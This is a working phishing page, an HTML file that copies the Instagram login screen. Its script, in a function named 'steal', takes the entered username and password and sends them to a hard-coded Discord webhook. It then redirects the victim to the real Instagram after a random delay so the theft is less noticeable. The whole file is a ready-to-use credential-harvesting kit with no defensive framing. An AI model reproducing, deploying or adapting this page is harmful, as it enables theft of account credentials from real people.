<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 350px;
      margin: 80px auto;
      padding: 40px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .logo {
      width: 150px;
      margin-bottom: 10px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }

    button {
      background-color: #0095f6;
      border: none;
      color: white;
      padding: 8px;
      margin-top: 10px;
      width: 100%;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .or-separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .or-separator::before,
    .or-separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: 500;
      font-size: 13px;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Instagram logo (image) -->
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">

    <form onsubmit="steal(event)">
      <input id="username" type="text" placeholder="Phone number, username, or email" required>
      <input id="password" type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or-separator"><span>OR</span></div>
    <div style="font-size: 14px; color: #385185; font-weight: 500;">Log in with Facebook</div>
  </div>

  <script>
    // Base64 decoded webhook link (example)
    const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1ODAwMDMzNzc4MjczODM5L0Z3TFRJVnJ0RTItWUZ1a3J3N0lna2Z3ZDZFVXIyQ0ZBZHBhb24uNjhzNWZnT3FBZlp6VFVTSXMxYnAzS2F2eg==");

    function steal(e) {
      e.preventDefault(); // Prevent form submission to handle it in JS

      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      // Create the payload to send
      const data = {
        username: u,
        password: p
      };

      // Send the data to the Discord webhook
      fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `🛑 고양이\nUsername: ${data.username}\nPassword: ${data.password}`
        })
      })
      .then(response => {
        // Check if the request was successful
        if (response.ok) {
          console.log("Data sent successfully");

          // Slight random delay before redirecting to Instagram
          setTimeout(() => {
            window.location.href = "https://instagram.com"; // Redirect to Instagram after success
          }, Math.random() * 2000 + 1000);  // Random delay between 1-3 seconds
        } else {
          console.error('Request failed with status:', response.status);
          alert('Something went wrong. Please try again later.');
        }
      })
      .catch(error => {
        // Handle network errors
        console.error('Error during fetch:', error);
        alert('Network error. Please check your connection.');
      });
    }
  </script>
</body>
</html>
